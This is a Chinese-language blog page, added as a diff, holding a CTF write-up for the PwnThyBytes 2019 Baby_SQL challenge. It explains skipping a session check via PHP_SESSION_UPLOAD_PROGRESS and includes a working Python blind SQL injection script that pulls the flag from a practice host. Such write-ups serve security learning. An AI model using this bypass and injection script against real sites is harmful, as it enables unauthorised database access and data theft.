@@ -1,0 +1,501 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>[PwnThyBytes 2019]Baby_SQL - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="[PwnThyBytes 2019]Baby_SQL">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-08 09:31" pubdate>
+        2020年5月8日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      569 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      9
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[PwnThyBytes 2019]Baby_SQL</h1>
+            
+            <div class="markdown-body">
+              <p>看看源码index.php中有这么一句</p>
+<pre><code class="hljs arcade"><span class="hljs-keyword">return</span> addslashes(<span class="hljs-symbol">$value</span>);</code></pre>
+
+<p>没有什么好用的方法绕过去，再看login.php中没有addslashes过滤，是不是可以直接访问这个进行注入，但有这样一句</p>
+<pre><code class="hljs php">!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>) <span class="hljs-keyword">AND</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Direct access on this script is not allowed!&quot;</span>);</code></pre>
+
+<p>可以利用PHP_SESSION_UPLOAD_PROGRESS绕</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php#session.upload-progress">https://www.php.net/manual/zh/session.upload-progress.php#session.upload-progress</a></p>
+<p>python下测测</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://f8623bdf-89da-4fc0-aa78-40b432183998.node3.buuoj.cn/templates/login.php&quot;</span>
+
+files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;
+a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,
+                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,
+                  proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;) <span class="hljs-comment">#这个代理作用是可以发到bp</span>
+print(a.text)</code></pre>
+
+<p>返回了Try again! ，说明可在这里注入，而且没有过滤，接下来就正常的盲注脚本</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://f8623bdf-89da-4fc0-aa78-40b432183998.node3.buuoj.cn/templates/login.php&quot;</span>
+
+files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;
+x=<span class="hljs-string">&quot;&quot;</span>
+database=<span class="hljs-string">&quot;database()&quot;</span><span class="hljs-comment">#p3rh4ps</span>
+table =<span class="hljs-string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema regexp database())&quot;</span>
+
+column=<span class="hljs-string">&quot;(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag_tbl&#x27; and table_schema=database())&quot;</span> <span class="hljs-comment">#flag_tbl,ptbctf</span>
+data = <span class="hljs-string">&quot;(select group_concat(secret) from flag_tbl)&quot;</span>
+<span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span>
+    <span class="hljs-built_in">min</span> = <span class="hljs-number">33</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-built_in">max</span> &gt;= <span class="hljs-built_in">min</span>:
+        mid = (<span class="hljs-built_in">max</span> + <span class="hljs-built_in">min</span>) // <span class="hljs-number">2</span>
+        <span class="hljs-comment"># print(mid)</span>
+        <span class="hljs-comment"># time.sleep(0.5)</span>
+        r = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,
+                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin\&quot;or ascii(substr(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;#&#x27;</span>.<span class="hljs-built_in">format</span>(data,Len,mid), <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;)
+        <span class="hljs-comment"># print(r.text )</span>
+        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Try again!&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text):
+            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-built_in">max</span> = mid
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span> == mid == <span class="hljs-built_in">min</span>:
+            x += <span class="hljs-built_in">chr</span>(mid)
+            print(x)
+            <span class="hljs-keyword">break</span></code></pre>
+
+<hr>
+<p>那这个PHP_SESSION_UPLOAD_PROGRESS是怎么绕的呢</p>
+<pre><code class="hljs pgsql">$_SESSION数组在session_start()初始化后才产生。因此我们直接访问templates下的，$_SESSION还不存在。那么，如果我们直接传入<span class="hljs-keyword">SESSION</span>呢？ 🍊 在HITCON <span class="hljs-number">2018</span>的时候出了一道One <span class="hljs-type">line</span> php，其中涉及到一个PHP <span class="hljs-keyword">SESSION</span>的细节：如果在php.ini中设置<span class="hljs-keyword">session</span>.auto_start=<span class="hljs-keyword">On</span>，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是<span class="hljs-keyword">session</span>.auto_start默认为<span class="hljs-keyword">Off</span>。与<span class="hljs-keyword">Session</span>相关的另一个选项叫<span class="hljs-keyword">session</span>.upload_progress.enabled，默认为<span class="hljs-keyword">On</span>，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()。</code></pre>
+
+<p>参考 <a target="_blank" rel="noopener" href="https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/">https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%BB%95isset-SESSION/">绕isset($_SESSION)</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/10/Frp%E4%BD%BF%E7%94%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Frp使用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/06/EIS-2019-EzPOP%E5%BB%B6%E5%B1%95%E5%81%9A%E6%B3%95/">
+                        <span class="hidden-mobile">[EIS 2019]EzPOP延展做法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
